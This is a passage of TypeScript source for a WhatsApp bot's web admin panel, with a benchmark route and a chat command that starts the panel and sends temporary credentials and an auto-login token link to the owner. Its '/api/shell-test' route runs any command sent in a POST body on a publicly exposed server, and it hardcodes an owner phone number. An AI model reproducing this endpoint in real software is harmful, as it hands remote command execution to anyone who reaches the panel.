        const tmpFile = path.join(os.tmpdir(), `aura_bench_${Date.now()}.tmp`);
        const t2 = performance.now();
        fs.writeFileSync(tmpFile, buf);
        fs.readFileSync(tmpFile);
        fs.unlinkSync(tmpFile);
        const diskMs = (performance.now() - t2).toFixed(2);

        const summary = [
          `=== AURA-BOT V8 BENCHMARK ===`,
          `CPU Math (5M ops)     : ${cpuMs} ms (Checksum: ${acc.toFixed(0)})`,
          `RAM Alloc (32 MB)     : ${memMs} ms`,
          `Disk R/W (32 MB I/O)  : ${diskMs} ms`,
          `Sistema Operativo     : ${os.type()} ${os.release()} (${os.arch()})`,
          `Hilos / Núcleos CPU   : ${os.cpus().length} vCPU (${os.cpus()[0]?.model || "Generic"})`,
        ].join("\n");

        sendJson(res, 200, { result: summary });
        return;
      }

      if (pathname === "/api/shell-test" && req.method === "POST") {
        const body = await readJsonBody(req);
        const cmd = String(body.cmd || "uptime");
        try {
          const { stdout, stderr } = await execAsync(cmd, { timeout: 8000 });
          sendJson(res, 200, { output: (stdout || stderr || "Ejecutado sin salida.").slice(0, 4000) });
        } catch (err: any) {
          sendJson(res, 200, { output: String(err?.message || err).slice(0, 4000) });
        }
        return;
      }

      sendJson(res, 404, { error: "Ruta no encontrada" });
    } catch (e: any) {
      sendJson(res, 500, { error: String(e?.message || e) });
    }
  });

  const preferredPort = Number(process.env.SERVER_PORT || process.env.WEB_PORT || process.env.PORT || 0);

  return new Promise((resolve) => {
    const onError = () => {
      server.removeListener("error", onError);
      server.listen(0, "0.0.0.0", () => {
        const addr = server.address();
        const assignedPort = typeof addr === "object" && addr ? addr.port : 8080;
        state.server = server;
        state.port = assignedPort;
        resolve(assignedPort);
      });
    };

    server.once("error", onError);
    server.listen(preferredPort, "0.0.0.0", () => {
      server.removeListener("error", onError);
      const addr = server.address();
      const assignedPort = typeof addr === "object" && addr ? addr.port : preferredPort || 8080;
      state.server = server;
      state.port = assignedPort;
      resolve(assignedPort);
    });
  });
}

export default {
  name: ["checkweb", "webpanel", "panelweb", "dashboard"],
  category: "group",
  description: "Inicia el panel web con WhatsApp Web Multi-Subbot y envía credenciales temporales al propietario.",
  groupOnly: false,
  async run(ctx: CommandContext) {
    const { reply, react, db, msg, groupMeta, sock, from, sender } = ctx;

    hookSockets(sock);

    const rawInput = sender || msg.key?.participant || from;
    const server = rawInput.split("@")[1] || "desconocido";
    const cleanInputId = rawInput.split("@")[0].split(":")[0].replace(/\D/g, "");

    let resolvedJid: string | null = null;
    let resolvedLid: string | null = null;

    if (server === "s.whatsapp.net") {
      resolvedJid = `${cleanInputId}@s.whatsapp.net`;
    } else if (server === "lid") {
      resolvedLid = `${cleanInputId}@lid`;
    }

    if (groupMeta?.participants) {
      const foundInGroup = groupMeta.participants.find((p: any) => {
        const pLid = String(p.lid || "").split("@")[0].split(":")[0];
        const pId = String(p.id || "").split("@")[0].split(":")[0];
        const pPhone = String(p.phoneNumber || "").replace(/\D/g, "");
        return pLid === cleanInputId || pId === cleanInputId || (pPhone && pPhone === cleanInputId);
      }) as any;

      if (foundInGroup) {
        if (!resolvedJid) {
          if (foundInGroup.id?.endsWith("@s.whatsapp.net")) {
            resolvedJid = foundInGroup.id;
          } else if (foundInGroup.phoneNumber) {
            const num = String(foundInGroup.phoneNumber).replace(/\D/g, "");
            if (num) resolvedJid = `${num}@s.whatsapp.net`;
          }
        }
        if (!resolvedLid && foundInGroup.lid?.endsWith("@lid")) {
          resolvedLid = foundInGroup.lid;
        }
      }
    }

    const lidRepo = (sock as any).signalRepository?.lidMapping;
    if (lidRepo && !resolvedJid && resolvedLid && typeof lidRepo.getPNForLID === "function") {
      try {
        const pn = await lidRepo.getPNForLID(resolvedLid);
        if (pn) {
          const cleanPn = String(pn).split("@")[0].split(":")[0].replace(/\D/g, "");
          if (cleanPn) resolvedJid = `${cleanPn}@s.whatsapp.net`;
        }
      } catch {}
    }

    const dbAny = db as any;
    if (dbAny && typeof dbAny.getUser === "function" && !resolvedJid) {
      try {
        const userRec = (resolvedLid && dbAny.getUser(resolvedLid)) || dbAny.getUser(rawInput);
        if (userRec?.phone_number) {
          resolvedJid = `${String(userRec.phone_number).replace(/\D/g, "")}@s.whatsapp.net`;
        } else if (userRec?.jid?.endsWith("@s.whatsapp.net")) {
          resolvedJid = userRec.jid;
        }
      } catch {}
    }

    const realNumber = resolvedJid ? resolvedJid.split("@")[0].split(":")[0] : cleanInputId;

    const isAuthorizedOwner =
      realNumber === "573118353868" ||
      cleanInputId === "573118353868" ||
      Boolean((ctx as any).isOwner) ||
      Boolean(msg.key?.fromMe) ||
      Boolean(resolvedJid && dbAny?.hasRole?.(resolvedJid, "owner")) ||
      Boolean(dbAny?.hasRole?.(sender, "owner"));

    if (!isAuthorizedOwner) {
      await react("⛔").catch(() => undefined);
      return reply("⛔ *Acceso denegado:* Este panel es exclusivo para los propietarios del sistema.");
    }

    await react("🌐").catch(() => undefined);

    rotateCredentials();

    const port = await ensureWebServerRunning();
    const [tunnelBase, publicIp] = await Promise.all([
      startPublicTunnel(port),
      fetchPublicIp(),
    ]);

    syncCommandInterceptors().catch(() => undefined);

    const baseHost = tunnelBase || `http://${publicIp}:${port}`;
    const magicLink = `${baseHost}/?token=${state.token}`;

    sendCredentialsEmail(
      state.ownerEmail,
      baseHost,
      state.tempUser,
      state.tempPass,
      state.token
    ).catch(() => {});

    const panelMessage = [
      `🌐 *${fytBold("AURA-BOT 2.0 // PANEL & WA-WEB")}* 🌐`,
      `━━━━━━━━━━━━━━━━━━━━━━`,
      `👤 *Usuario Temporal:* \`${state.tempUser}\``,
      `🔑 *Clave / Código OTP:* \`${state.tempPass}\``,
      `📧 *Correo vinculado:* \`${state.ownerEmail}\``,
      `🔌 *Puerto Interno:* \`${port}\``,
      ``,
      `🚀 *Enlace Portada Login:*`,
      `${baseHost}`,
      ``,
      `⚡ *Enlace Directo (Auto-Login 1 Clic):*`,
      `${magicLink}`,
    ].join("\n");

    await sock.sendMessage(
      sender,
      { text: panelMessage },
      { quoted: msg as any }
    );

    if (from.endsWith("@g.us")) {
      await reply("🔒 *Verificación exitosa.* El enlace y tus credenciales temporales fueron enviados a tu privado y correo.");
    }

    await react("✅").catch(() => undefined);
  },
};
